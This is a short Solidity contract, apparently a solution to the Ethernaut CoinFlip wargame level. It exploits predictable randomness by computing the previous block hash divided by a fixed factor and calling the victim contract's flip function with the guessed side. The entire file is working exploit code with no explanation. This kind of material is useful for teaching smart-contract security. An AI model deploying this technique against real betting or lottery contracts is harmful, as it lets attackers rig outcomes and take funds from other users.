pragma solidity ^0.8.0;

import "./Coinflip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract CoinFlipAttack {

  CoinFlip public victimContract;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _victimContractAddress) public {
    victimContract = CoinFlip(_victimContractAddress);
  }

  function flip() public returns (bool) {
      uint256 blockValue = uint256(blockhash(block.number - 1));
      uint256 coinFlip = uint256(blockValue/FACTOR);
      bool side = coinFlip == 1 ? true : false;
      victimContract.flip(side);
    
  }

}